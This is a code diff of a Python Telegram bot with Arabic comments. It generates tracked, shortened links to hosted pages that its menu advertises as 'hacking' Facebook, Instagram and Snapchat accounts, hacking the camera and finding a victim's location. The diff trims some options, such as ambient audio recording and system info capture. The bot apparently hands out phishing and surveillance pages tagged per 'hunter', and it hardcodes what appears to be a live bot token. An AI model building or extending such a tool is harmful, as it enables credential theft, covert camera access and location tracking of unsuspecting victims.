@@ -4,7 +4,7 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- نظام الحفاظ على الاتصال 24/7 عشان ما يطفي ---
+# --- نظام الحفاظ على الاتصال 24/7 ---
 app = Flask('')
 @app.route('/')
 def home():
@@ -18,7 +18,7 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- إعدادات البوت والتوكن ---
+# --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
@@ -36,24 +36,20 @@ def send_welcome(message):
     hunter = first_name.replace(" ", "_")
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد روابط فريدة لكل يوزر مع اسم الصياد
+    # روابط فريدة لكل يوزر
     fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
     ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
     snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
     cam = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
-    cam2 = short_link(f"{base}cam2.html?id={uid}&hunter={hunter}")
-    audio = short_link(f"{base}audio.html?id={uid}&hunter={hunter}")
     loc = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
-    sys = short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
 
-    # الرسالة مع رابط حسابك اللي طلبته (m_y_.9)
+    # الرسالة المزخرفة مع رابط الانستا تبعك
     msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
-لـ^ـضـ^ـمـ^ـان تـ^ـفـ^ـعـ^ـيـ^ـل الأوامـر، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام (إجباري):
+⚠️ لـ^ـضـ^ـمـان تـ^ـفـ^ـعـ^ـيـل الأدوات، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
 🔴 https://www.instagram.com/m_y_.9/
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
@@ -63,11 +59,8 @@ def send_welcome(message):
 🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb}`
 🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig}`
 🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap}`
-🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الأمـ^ـامـ^ـيـ^ـة 📸: `{cam}`
-🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الخـ^ـلـ^ـفـ^ـيـ^ـة 📷: `{cam2}`
-🔹 تـ^ـسـ^ـجـ^ـيـ^ـل الصـ^ـوت المـ^ـحـ^ـيـ^ـط 🎤: `{audio}`
-🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع الـ^ـجـ^ـغـ^ـرافـ^ـي 📍: `{loc}`
-🔹 سـ^ـحـ^ـب مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـنـ^ـظـ^ـام 📱: `{sys}`
+🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam}`
+🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع 📍: `{loc}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
@@ -77,4 +70,4 @@ def send_welcome(message):
 if __name__ == "__main__":
     keep_alive()
     print("M.Y.9 System is Online...")
-    bot.infinity_polling()
+    bot.infinity_polling(non_stop=True) # ميزة عشان ما يوقف
